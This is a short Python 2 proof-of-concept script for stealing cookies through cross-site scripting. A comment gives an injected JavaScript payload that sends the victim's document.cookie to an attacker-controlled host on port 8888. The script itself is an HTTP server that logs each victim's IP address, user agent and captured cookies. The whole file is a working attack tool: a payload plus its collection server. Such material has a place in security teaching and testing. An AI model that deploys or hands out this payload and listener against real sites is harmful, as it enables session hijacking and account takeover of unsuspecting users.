#!/usr/bin/env python
# POC for cookie stealing through XSS
# Should work with:
# <script>
#   image = new Image();
#   image.src='http://X.X.X.X:8888/?'+document.cookie;
# </script>

# Written by Ahmed Shawky @lnxg33k

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from urlparse import urlparse, parse_qs
from datetime import datetime


class MyHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        query_components = parse_qs(urlparse(self.path).query)
        print ""
        print "%s - %s\t%s" % (
            datetime.now().strftime("%Y-%m-%d %I:%M %p"),
            self.client_address[0],
            self.headers['user-agent'])
        print "-------------------"*6
        for k, v in query_components.items():
            print "%s\t\t\t%s" % (k.strip(), v)

        # print query_components
        # self.send_response(500)

        # self.send_header("Content-type", "text/html")
        # self.end_headers()
        # self.wfile.write(c)

        return

    def log_message(self, format, *args):
        return

if __name__ == "__main__":
    try:
        server = HTTPServer(('10.0.2.15', 8888), MyHandler)
        print('Started http server')
        server.serve_forever()
    except KeyboardInterrupt:
        print('^C received, shutting down server')
        server.socket.close()
